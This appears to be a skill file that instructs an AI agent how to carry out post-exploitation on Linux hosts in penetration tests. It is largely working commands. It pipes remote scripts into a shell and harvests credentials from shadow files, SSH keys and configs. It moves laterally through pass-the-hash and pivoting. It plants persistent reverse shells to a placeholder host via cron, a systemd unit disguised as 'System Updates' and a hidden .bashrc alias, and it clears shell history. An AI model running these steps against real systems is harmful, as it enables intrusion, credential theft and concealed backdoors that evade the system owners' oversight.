---
name: post
description: "Post-exploitation: privilege escalation, credential harvesting, lateral movement, persistence, and data gathering after initial access. Use when: user has a shell and wants to escalate privileges, find interesting files, harvest credentials, move laterally to other hosts, set up persistence, pivot networks, or gather evidence. This is post-access work. NOT for: getting initial access (use exploit skill), scanning (use enum skill), or reporting (use reporting skill)."
metadata: { "openclaw": { "emoji": "🏴‍☠️" } }
---

# Post-Exploitation Skill

You're in. Now escalate, persist, move laterally, and gather evidence.

## When to Use

✅ **USE this skill when:**
- "I got a shell, now what?"
- "Escalate to root on this host"
- "Find SUID binaries" / "Check for privilege escalation"
- "Harvest credentials from this machine"
- "Set up persistence"
- "Move laterally to other hosts"
- "Pivot through this machine"
- "Find interesting files / sensitive data"
- "What can I access from here?"

## When NOT to Use

❌ **DON'T use this skill when:**
- Still trying to get initial access → use exploit skill
- Haven't confirmed a foothold yet → use exploit skill
- Need to report findings → use reporting skill

## ⚠️ Documentation Requirement

Post-exploitation generates the most valuable evidence for the report. **Document everything**:
- Commands run and output
- Credentials found
- Machines accessed
- Files/data discovered
- Persistence mechanisms planted

Save to `engagements/<target>/post-exploit/` following the workspace engagement structure. The orchestrator will specify the target name. NEVER create ad-hoc directories.

## Phase 1 — Recon Your Position

Once you have a shell, figure out where you are:

```bash
# Who am I?
id
whoami

# Where am I?
pwd
ls -la

# What system?
uname -a
cat /etc/os-release
hostname

# Network position
ip addr          # or ifconfig
ip route         # or route -n
cat /etc/hosts

# What's running?
ps aux
systemctl list-units --type=service

# What can I access?
ls -la /home/
ls -la /root/
ls -la /var/www/
```

## Phase 2 — Privilege Escalation

### Automated Enumeration

```bash
# LinPEAS (best all-in-one)
curl -s http://<your_ip>/linpeas.sh | sh
# Or transfer and run
wget http://<your_ip>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# LinEnum
./LinEnum.sh -t -r /tmp/linenum_report

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### Manual Checks

#### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
# Common SUID privesc: vim, find, python, less, nmap
```

#### Capabilities
```bash
getcap -r / 2>/dev/null
# Look for: cap_setuid, cap_dac_override, cap_sys_admin
```

#### Sudo Rights
```bash
sudo -l
# Look for NOPASSWD entries or dangerous commands
```

#### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/crontabs/
crontab -l
# Look for writable cron scripts
```

#### Kernel Exploits
```bash
uname -r
# Cross-reference with linux-exploit-suggester
# Common: DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
```

#### Writable Files
```bash
# Writable /etc/passwd
ls -la /etc/passwd

# Writable scripts run by root
find /etc -writable 2>/dev/null
find /var -writable -type f 2>/dev/null
```

### Privilege Escalation Checklist

| Check | Command | Look For |
|-------|---------|----------|
| SUID | `find / -perm -4000 -type f 2>/dev/null` | Unusual binaries |
| Capabilities | `getcap -r / 2>/dev/null` | cap_setuid, cap_dac |
| Sudo | `sudo -l` | NOPASSWD, dangerous bins |
| Cron | `cat /etc/crontab` | Writable scripts |
| Kernel | `uname -r` | Old versions → exploits |
| Processes | `ps aux | grep root` | Running as root, writable paths |
| NFS | `cat /etc/exports` | no_root_squash |
| Docker | `groups` | docker group = root |
| Passwords | `grep -r "password" /etc/ 2>/dev/null` | Plaintext creds |

## Phase 3 — Credential Harvesting

```bash
# Bash history
cat ~/.bash_history
cat /root/.bash_history

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Config files with passwords
grep -r "password\|passwd\|secret\|key" /etc/ 2>/dev/null | grep -v ":$" | head -20
grep -r "password\|passwd" /var/www/ 2>/dev/null | head -20

# Application configs
cat /var/www/html/wp-config.php
cat /var/www/html/.env
cat /etc/mysql/my.cnf

# Memory (if possible)
sudo strings /dev/mem | grep -i pass

# Shadow file
cat /etc/shadow
# Crack with: john shadow.txt or hashcat -m 1800 shadow.txt rockyou.txt
```

## Phase 4 — Lateral Movement

### SSH Keys
```bash
# Use stolen SSH keys
ssh -i /path/to/id_rsa user@target
ssh -i /path/to/id_rsa -J pivot_host target_host
```

### SSH Tunneling / Pivoting
```bash
# Local port forward (expose remote service locally)
ssh -L 8080:internal-host:80 user@pivot

# Remote port forward (expose local service remotely)
ssh -R 9090:localhost:4444 user@pivot

# Dynamic proxy (SOCKS through pivot)
ssh -D 1080 -N user@pivot
# Then: proxychains nmap -sT <internal_target>
```

### ProxyChains
```bash
# Configure /etc/proxychains4.conf
# Add: socks4 127.0.0.1 1080

# Scan through pivot
proxychains nmap -sT -Pn 192.168.2.0/24

# Connect through pivot
proxychains ssh user@internal-host
```

### Pass-the-Hash (Windows/Linux)
```bash
# CrackMapExec (SMB)
crackmapexec smb 192.168.1.0/24 -u user -H <ntlm_hash>

# evil-winrm
evil-winrm -i 192.168.1.105 -u Administrator -H <ntlm_hash>
```

## Phase 5 — Persistence

### SSH Key Persistence
```bash
# Add your key to authorized_keys
echo "ssh-rsa AAAA... attacker@box" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Cron Job Persistence
```bash
# Reverse shell cron (every 5 min)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1") | crontab -
```

### Systemd Service (if root)
```bash
cat > /etc/systemd/system/updates.service << 'EOF'
[Unit]
Description=System Updates

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable updates.service
systemctl start updates.service
```

### Backdoor Binary
```bash
# Replace a common binary with a backdoor version
cp /bin/bash /tmp/.bash_hidden
# Add alias or modify PATH
echo 'alias ls="ls; /tmp/.bash_hidden -i >& /dev/tcp/<IP>/<PORT> 0>&1"' >> ~/.bashrc
```

## Phase 6 — Evidence Gathering

```bash
# Create evidence directory in engagement structure
mkdir -p engagements/<target>/post-exploit/evidence/

# System info
uname -a > engagements/<target>/post-exploit/evidence/system_info.txt
cat /etc/os-release >> engagements/<target>/post-exploit/evidence/system_info.txt
ip addr >> engagements/<target>/post-exploit/evidence/network_info.txt
ps aux >> engagements/<target>/post-exploit/evidence/processes.txt

# User accounts
cat /etc/passwd > engagements/<target>/post-exploit/evidence/passwd.txt
cat /etc/shadow > engagements/<target>/post-exploit/evidence/shadow.txt 2>/dev/null

# Network connections
netstat -tulpn > engagements/<target>/post-exploit/evidence/connections.txt
ss -tulpn >> engagements/<target>/post-exploit/evidence/connections.txt

# File discovery
find / -name "*.doc" -o -name "*.pdf" -o -name "*.kdbx" 2>/dev/null > engagements/<target>/post-exploit/evidence/interesting_files.txt
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null > engagements/<target>/post-exploit/evidence/keys.txt

# Screenshots (if GUI)
import -window root engagements/<target>/post-exploit/evidence/screenshot.png
```

## Cleanup

When the engagement ends, remove all persistence:

```bash
# Remove cron
crontab -r

# Remove systemd service
systemctl stop updates.service
systemctl disable updates.service
rm /etc/systemd/system/updates.service

# Remove SSH key
sed -i '/attacker@box/d' ~/.ssh/authorized_keys

# Remove backdoors
rm /tmp/.bash_hidden

# Clear logs (if authorized)
echo > ~/.bash_history
```
